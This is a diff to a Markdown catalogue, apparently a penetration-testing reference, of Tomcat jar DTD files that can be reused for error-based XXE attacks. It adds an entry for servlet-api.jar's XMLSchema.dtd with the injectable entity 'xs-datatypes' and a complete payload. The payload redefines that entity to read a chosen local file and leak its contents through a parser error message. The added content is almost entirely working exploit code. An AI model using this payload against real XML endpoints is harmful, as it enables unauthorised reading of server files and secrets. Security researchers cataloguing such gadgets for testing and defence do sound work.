@@ -46,9 +46,6 @@
 
  --- 
 
-
-
-
 **DTD File:** `/usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd`
 
 **Injectable entity:** `%URI`
@@ -71,7 +68,6 @@
 ```
 
  --- 
-
 
 **DTD File:** `/usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd`
 
@@ -510,3 +506,28 @@
 ]>
 <message></message>
 ```
+
+ --- 
+
+**DTD File:** `/usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd`
+
+**Injectable entity:** `xs-datatypes`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd">
+
+    <!ENTITY % xs-datatypes '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
